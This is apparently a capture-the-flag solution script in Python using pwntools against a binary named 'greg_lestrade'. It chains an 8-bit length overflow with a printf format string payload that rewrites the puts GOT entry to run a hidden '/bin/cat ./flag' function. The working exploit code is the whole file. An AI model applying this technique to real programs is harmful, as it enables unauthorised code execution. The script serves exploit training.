#!/usr/bin/env python2
"""
Vulnerability

1) admin action passes arbitrary `read` string to printf
  => format string exploit, gives arbitrary write
2) checks that all characters up to `strlen(input) + 1` are lower case, but strlen is cast to 8 bit integer
  => using string of length 255 overflows to 255 + 1 = 0 for int8
"""
from pwn import *

### Setup

exe = context.binary = ELF("./greg_lestrade")
conn = process(exe.path)
#conn = remote("146.185.132.36", 12431)

def auth():
    # this string can be found easily by examining the binary
    conn.sendlineafter("Credential :", "7h15_15_v3ry_53cr37_1_7h1nk")

def menu(action):
    conn.recvline_contains("1) admin action")
    conn.sendline(str(action))

auth()
menu(1)

### Exploit

# The binary already has a hidden function that we want to execute:

# 0x00400876      55             push rbp
# 0x00400877      4889e5         mov rbp, rsp
# 0x0040087a      bf040c4000     mov edi, str._bin_cat_._flag ; 0x400c04 ; "/bin/cat ./flag"
# 0x0040087f      b800000000     mov eax, 0
# 0x00400884      e877feffff     call sym.imp.system
#
# (can easily be found by looking at the string references: /bin/cat ./flag is suspicious)
#
# Idea: overwrite puts entry in global offset table with 0x00400876 so that puts() executes
# that function instead.

# %8$p for printf prints the beginning of our input string
offset = 8

conn.sendlineafter("command : ", fit({
    0: [
        # first, reset the GOT entry to 0
        "%40$lln", # %40 is the location where the data at +0x100 in our input ends up

        # set the second-lower 2 bytes to 0x0040
        "%38${}c%41$hn".format(0x40),

        # set the lower 2 bytes  to 0x0875
        "%38${}c%40$hn".format(0x0876 - 0x40),
    ],

    # make sure that string has length 255 to pass lowercase check
    # (pwntools fills the space between with non-null characters so our string won't be shorter)
    0xff: p8(0x0),

    # this will be accesible from printf as %(offset + 0x100/8)$... = %40$...
    0x100: p64(exe.got["puts"]),
    0x108: p64(exe.got["puts"] + 2),
}))

# this prints flag
conn.interactive()
